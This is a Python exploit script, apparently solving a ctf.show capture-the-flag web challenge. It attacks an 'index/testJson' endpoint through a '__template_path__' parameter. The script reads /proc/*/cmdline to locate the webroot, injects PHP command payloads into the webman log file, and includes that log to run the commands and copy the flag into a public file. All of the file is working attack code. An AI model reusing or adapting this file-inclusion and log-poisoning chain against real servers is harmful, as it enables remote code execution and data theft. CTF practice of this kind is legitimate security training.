import requests
import time
from datetime import datetime

url = "http://19eef278-c30f-41f3-a448-f09d0b567a49.challenge.ctf.show/"

def get_webroot():
    print("[+] Getting webroot...")
    
    webroot = ""

    for i in range(1,300):
        r = requests.get(url=url+'index/testJson?data={{"name": "guest", "__template_path__": "/proc/{}/cmdline"}}'.format(i))   
        time.sleep(0.2)
        if "start.php" in r.text:
            print(f"[\033[31m*\033[0m] Found start.php at /proc/{i}/cmdline")
            webroot = r.text.split("start_file=")[1][:-10]
            print(f"Found webroot: {webroot}")
            break
    return webroot

def send_shell(webroot):
    # payload = 'index/testJson?data={{"name":"guest","__template_path__":"<?php%20`ls%20/>{}/public/ls.txt`;?>"}}'.format(webroot)
    payload = 'index/testJson?data={{"name":"guest","__template_path__":"<?php%20`cat%20/s00*>{}/public/flag.txt`;?>"}}'.format(webroot)
    r = requests.get(url=url+payload)
    time.sleep(1)
    if r.status_code == 500:
        print("[\033[31m*\033[0m] Shell sent successfully")
    else:
        print("Failed to send shell")

def include_shell(webroot):
    now = datetime.now()
    payload = 'index/testJson?data={{"name":"guest","__template_path__":"{}/runtime/logs/webman-{}-{}-{}.log"}}'.format(webroot, now.strftime("%Y"), now.strftime("%m"), now.strftime("%d"))
    r = requests.get(url=url+payload)
    time.sleep(5)
    r = requests.get(url=url+'flag.txt')
    if "ctfshow" in r.text:
        print("=================FLAG==================\n")
        print("\033[32m"+r.text+"\033[0m")
        print("=================FLAG==================\n")
        print("[\033[31m*\033[0m] Shell included successfully")
    else:
        print("Failed to include shell")

def exploit():
    webroot = get_webroot()
    send_shell(webroot)
    include_shell(webroot)

if __name__ == '__main__':
    exploit()
